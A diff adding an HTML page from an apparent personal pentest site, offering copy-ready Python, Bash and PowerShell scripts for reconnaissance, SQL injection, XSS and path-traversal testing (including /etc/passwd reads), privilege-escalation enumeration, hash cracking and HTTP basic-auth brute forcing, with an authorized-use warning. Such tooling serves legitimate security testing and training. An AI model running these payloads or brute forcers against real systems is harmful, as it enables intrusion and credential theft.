@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Scripts | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .scripts-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1.5rem; margin: 2rem 0; }
+    .script-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 1rem; padding: 1.5rem; transition: var(--transition); }
+    .script-card:hover { border-color: var(--primary); }
+    .script-card h3 { color: var(--primary); margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem; }
+    .script-card h3 i { font-size: 1rem; }
+    .script-card .language { display: inline-block; padding: 0.25rem 0.75rem; border-radius: 20px; font-size: 0.7rem; font-weight: 600; margin-bottom: 1rem; }
+    .lang-python { background: rgba(79,140,255,0.2); color: #4f8cff; }
+    .lang-bash { background: rgba(0,255,136,0.2); color: #00ff88; }
+    .lang-powershell { background: rgba(79,140,255,0.2); color: #4f8cff; }
+    .script-card p { color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1rem; }
+    .script-code { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 1rem; font-family: 'Courier New', monospace; font-size: 0.75rem; overflow-x: auto; max-height: 200px; margin-bottom: 1rem; }
+    .copy-btn { background: var(--primary); color: var(--bg-dark); border: none; padding: 0.5rem 1rem; border-radius: 0.5rem; cursor: pointer; font-weight: 600; font-size: 0.85rem; }
+    .copy-btn:hover { background: var(--primary-dark); }
+    .category-section { margin: 3rem 0; }
+    .category-section h2 { margin-bottom: 1.5rem; }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    .warning-box { background: rgba(255,136,0,0.1); border-left: 4px solid #ff8800; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .warning-box strong { color: #ff8800; }
+    .usage-note { background: var(--bg-elevated); padding: 0.75rem; border-radius: 0.5rem; font-size: 0.85rem; color: var(--text-secondary); margin-top: 1rem; }
+    .usage-note code { background: var(--bg-card); padding: 0.2rem 0.5rem; border-radius: 3px; }
+    @media (max-width: 768px) { .scripts-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../web/index.html">Web Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / Scripts
+    </div>
+
+    <div class="page-header">
+      <h1>🛠️ Security Scripts</h1>
+      <p style="color: var(--text-secondary); font-size: 1.1rem; max-width: 800px;">
+        Ready-to-use automation scripts for penetration testing, reconnaissance, and security assessments. Copy and run in your testing environment.
+      </p>
+    </div>
+
+    <div class="warning-box">
+      <strong>⚠️ Usage Policy:</strong> These scripts are for authorized security testing only. Ensure you have explicit permission before running any security tools against target systems.
+    </div>
+
+    <!-- RECONNAISSANCE SCRIPTS -->
+    <div class="category-section" id="recon">
+      <h2>🔍 Reconnaissance Scripts</h2>
+      
+      <div class="scripts-grid">
+        <div class="script-card">
+          <h3><i class="fas fa-search"></i> Subdomain Enumerator</h3>
+          <span class="language lang-python">Python</span>
+          <p>Enumerate subdomains using wordlist and DNS resolution.</p>
+          <div class="script-code">
+<pre>import dns.resolver
+import socket
+
+def enumerate_subdomains(domain, wordlist):
+    found = []
+    with open(wordlist) as f:
+        for line in f:
+            subdomain = line.strip() + '.' + domain
+            try:
+                ip = socket.gethostbyname(subdomain)
+                print(f"[+] {subdomain} -> {ip}")
+                found.append(subdomain)
+            except:
+                pass
+    return found
+
+if __name__ == '__main__':
+    enumerate_subdomains('example.com', 'subdomains.txt')</pre>
+          </div>
+          <button class="copy-btn" onclick="copyScript(this)">Copy</button>
+          <div class="usage-note"><code>pip install dnspython</code></div>
+        </div>
+
+        <div class="script-card">
+          <h3><i class="fas fa-globe"></i> HTTP Directory Scanner</h3>
+          <span class="language lang-python">Python</span>
+          <p>Scan web servers for common directories and files.</p>
+          <div class="script-code">
+<pre>import requests
+
+def scan_directories(url, wordlist):
+    found = []
+    with open(wordlist) as f:
+        for path in f:
+            path = path.strip()
+            target = f"{url}/{path}"
+            try:
+                r = requests.get(target, timeout=5)
+                if r.status_code == 200:
+                    print(f"[+] {target} ({r.status_code})")
+                    found.append(target)
+            except:
+                pass
+    return found
+
+if __name__ == '__main__':
+    scan_directories('http://target.com', 'dirs.txt')</pre>
+          </div>
+          <button class="copy-btn" onclick="copyScript(this)">Copy</button>
+          <div class="usage-note"><code>pip install requests</code></div>
+        </div>
+
+        <div class="script-card">
+          <h3><i class="fas fa-network-wired"></i> Port Scanner</h3>
+          <span class="language lang-python">Python</span>
+          <p>Fast TCP port scanner with concurrent connections.</p>
+          <div class="script-code">
+<pre>import socket
+from concurrent.futures import ThreadPoolExecutor
+
+def scan_port(host, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((host, port))
+        if result == 0:
+            print(f"[+] Port {port} is open")
+            sock.close()
+            return port
+    except:
+        pass
+
+def scan_ports(host, ports):
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        executor.map(lambda p: scan_port(host, p), ports)
+
+if __name__ == '__main__':
+    scan_ports('192.168.1.1', range(1, 1001))</pre>
+          </div>
+          <button class="copy-btn" onclick="copyScript(this)">Copy</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- WEB EXPLOITATION SCRIPTS -->
+    <div class="category-section" id="web">
+      <h2>🌐 Web Exploitation Scripts</h2>
+      
+      <div class="scripts-grid">
+        <div class="script-card">
+          <h3><i class="fas fa-database"></i> SQL Injection Scanner</h3>
+          <span class="language lang-python">Python</span>
+          <p>Basic SQL injection vulnerability scanner for GET parameters.</p>
+          <div class="script-code">
+<pre>import requests
+
+payloads = ["'", "' OR '1'='1", '" OR "1"="1', "1' AND 1=1--"]
+
+def test_sqli(url, param):
+    for payload in payloads:
+        target = f"{url}?{param}={payload}"
+        try:
+            r = requests.get(target, timeout=10)
+            if 'error' in r.text.lower() or 'sql' in r.text.lower():
+                print(f"[!] Potential SQLi: {target}")
+                return True
+        except:
+            pass
+    return False
+
+if __name__ == '__main__':
+    test_sqli('http://target.com/page.php', 'id')</pre>
+          </div>
+          <button class="copy-btn" onclick="copyScript(this)">Copy</button>
+        </div>
+
+        <div class="script-card">
+          <h3><i class="fas fa-code"></i> XSS Payload Tester</h3>
+          <span class="language lang-python">Python</span>
+          <p>Test web forms for reflected XSS vulnerabilities.</p>
+          <div class="script-code">
+<pre>import requests
+
+xss_payloads = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>"
+]
+
+def test_xss(url, param):
+    for payload in xss_payloads:
+        data = {param: payload}
+        try:
+            r = requests.post(url, data=data, timeout=10)
+            if payload in r.text:
+                print(f"[!] XSS found: {payload}")
+                return True
+        except:
+            pass
+    return False
+
+if __name__ == '__main__':
+    test_xss('http://target.com/search.php', 'q')</pre>
+          </div>
+          <button class="copy-btn" onclick="copyScript(this)">Copy</button>
+        </div>
+
+        <div class="script-card">
+          <h3><i class="fas fa-folder-open"></i> Path Traversal Tester</h3>
+          <span class="language lang-python">Python</span>
+          <p>Test parameters for path traversal vulnerabilities.</p>
+          <div class="script-code">
+<pre>import requests
+
+paths = [
+    "../../../../etc/passwd",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "....//....//....//etc/passwd"
+]
+
+def test_traversal(url, param):
+    for path in paths:
+        target = f"{url}?{param}={path}"
+        try:
+            r = requests.get(target, timeout=10)
+            if "root:" in r.text or "[extensions]" in r.text:
+                print(f"[!] Path Traversal: {target}")
+                return True
+        except:
+            pass
+    return False
+
+if __name__ == '__main__':
+    test_traversal('http://target.com/download', 'file')</pre>
+          </div>
+          <button class="copy-btn" onclick="copyScript(this)">Copy</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- PRIVILEGE ESCALATION SCRIPTS -->
+    <div class="category-section" id="privesc">
+      <h2>🔓 Privilege Escalation Scripts</h2>
+      
+      <div class="scripts-grid">
+        <div class="script-card">
+          <h3><i class="fab fa-linux"></i> Linux Enum Script</h3>
+          <span class="language lang-bash">Bash</span>
+          <p>Comprehensive Linux enumeration for privilege escalation.</p>
+          <div class="script-code">
+<pre>#!/bin/bash
+echo "[*] Linux Privilege Escalation Checker"
+
+echo "[*] Current User:"
+whoami
+id
+
+echo "[*] SUID Binaries:"
+find / -perm -4000 -type f 2>/dev/null
+
+echo "[*] Sudo Permissions:"
+sudo -l 2>/dev/null
+
+echo "[*] Writable /etc/passwd:"
+ls -la /etc/passwd | grep -E 'w.*r.*r'
+
+echo "[*] Cron Jobs:"
+ls -la /etc/cron* 2>/dev/null
+
+echo "[*] Network Connections:"
+netstat -tulpn 2>/dev/null
+
+echo "[*] Running Services:"
+ps aux | grep -E 'root|cron|ssh|apache'
+
+echo "[*] NFS Shares:"
+cat /etc/exports 2>/dev/null</pre>
+          </div>
+          <button class="copy-btn" onclick="copyScript(this)">Copy</button>
+        </div>
+
+        <div class="script-card">
+          <h3><i class="fab fa-windows"></i> Windows Enum Script</h3>
+          <span class="language lang-powershell">PowerShell</span>
+          <p>Windows privilege escalation enumeration script.</p>
+          <div class="script-code">
+<pre># Windows Privilege Escalation Checker
+Write-Host "[*] Windows Privilege Escalation Checker" -ForegroundColor Green
+
+Write-Host "`n[*] Current User:" -ForegroundColor Cyan
+whoami /all
+
+Write-Host "`n[*] User Privileges:" -ForegroundColor Cyan
+whoami /priv
+
+Write-Host "`n[*] System Info:" -ForegroundColor Cyan
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+Write-Host "`n[*] Running Services:" -ForegroundColor Cyan
+Get-Service | Where-Object {$_.Status -eq "Running"}
+
+Write-Host "`n[*] Scheduled Tasks:" -ForegroundColor Cyan
+schtasks /query /fo LIST 2>$null
+
+Write-Host "`n[*] AlwaysInstallElevated:" -ForegroundColor Cyan
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue</pre>
+          </div>
+          <button class="copy-btn" onclick="copyScript(this)">Copy</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- PASSWORD ATTACKS -->
+    <div class="category-section" id="passwords">
+      <h2>🔑 Password Attack Scripts</h2>
+      
+      <div class="scripts-grid">
+        <div class="script-card">
+          <h3><i class="fas fa-key"></i> Hash Cracker Template</h3>
+          <span class="language lang-python">Python</span>
+          <p>Basic hash cracking script using wordlist.</p>
+          <div class="script-code">
+<pre>import hashlib
+
+def crack_hash(target_hash, wordlist, algorithm='sha256'):
+    with open(wordlist) as f:
+        for word in f:
+            word = word.strip()
+            if algorithm == 'md5':
+                hashed = hashlib.md5(word.encode()).hexdigest()
+            elif algorithm == 'sha1':
+                hashed = hashlib.sha1(word.encode()).hexdigest()
+            else:
+                hashed = hashlib.sha256(word.encode()).hexdigest()
+            
+            if hashed.lower() == target_hash.lower():
+                print(f"[+] Found: {word}")
+                return word
+    return None
+
+if __name__ == '__main__':
+    result = crack_hash('5e884898da28047...', 'rockyou.txt', 'sha256')
+    print(f"Cracked: {result}")</pre>
+          </div>
+          <button class="copy-btn" onclick="copyScript(this)">Copy</button>
+        </div>
+
+        <div class="script-card">
+          <h3><i class="fas fa-lock"></i> Credential Brute Forcer</h3>
+          <span class="language lang-python">Python</span>
+          <p>Basic HTTP basic auth brute forcer.</p>
+          <div class="script-code">
+<pre>import requests
+from itertools import product
+
+def brute_force(url, users, passwords):
+    for user, pwd in product(users, passwords):
+        try:
+            r = requests.get(url, auth=(user, pwd), timeout=5)
+            if r.status_code == 200:
+                print(f"[+] Valid: {user}:{pwd}")
+                return (user, pwd)
+            else:
+                print(f"[-] Failed: {user}:{pwd}")
+        except:
+            pass
+    return None
+
+if __name__ == '__main__':
+    with open('users.txt') as f:
+        users = [u.strip() for u in f]
+    with open('passwords.txt') as f:
+        passwords = [p.strip() for p in f]
+    brute_force('http://target.com/admin', users, passwords)</pre>
+          </div>
+          <button class="copy-btn" onclick="copyScript(this)">Copy</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box">
+      <strong>Contributing Scripts:</strong> Have a useful security script? Submit it via the contact form and it may be added to this collection.
+    </div>
+
+    <a href="../index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Home</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+function copyScript(btn) {
+  const code = btn.parentElement.querySelector('.script-code pre').innerText;
+  navigator.clipboard.writeText(code);
+  const original = btn.textContent;
+  btn.textContent = 'Copied!';
+  setTimeout(() => btn.textContent = original, 2000);
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+</script>
+
+</body>
+</html>
